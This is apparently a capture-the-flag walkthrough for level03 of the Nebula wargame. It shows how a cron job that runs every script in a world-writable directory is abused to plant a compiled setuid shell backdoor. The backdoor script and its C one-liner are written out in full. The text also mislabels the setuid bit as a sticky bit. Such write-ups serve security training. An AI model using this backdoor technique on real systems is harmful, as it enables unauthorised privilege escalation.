# About
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

# Exploitation
```bash
level03@nebula:/home/flag03$ ls -l
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
```
There is 1 folder and 1 script, Let's look at `writable.sh`
```bash
level03@nebula:/tmp$ cat /home/flag03/writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
This shell script executes `.sh` files in `writable.d`.

So I will give a script to get backdoor file, the script is:
```bash
#!/bin/sh
rm /home/flag03/back*
echo 'int main(void) { setreuid(geteuid(), geteuid()); system("/bin/sh"); }' > /home/flag03/backdoor.c;
gcc -o /home/flag03/backdoor /home/flag03/backdoor.c
chmod 4777 /home/flag03/backdoor
```
This script makes `backdoor.c` file and compile it, and gives permission with sticky bit.

Copy that script to `writable.d` and wait for a minute. The file disappeared and directory became:
```bash
level03@nebula:/tmp$ ls -l /home/flag03/
total 13
-rwsrwxrwx 1 flag03 flag03 7243 2017-12-05 14:00 backdoor
-rw-rw-r-- 1 flag03 flag03   70 2017-12-05 14:00 backdoor.c
drwxrwxrwx 1 flag03 flag03   40 2017-12-05 14:00 writable.d
-rwxr-xr-x 1 flag03 flag03   98 2011-11-20 21:22 writable.sh
```
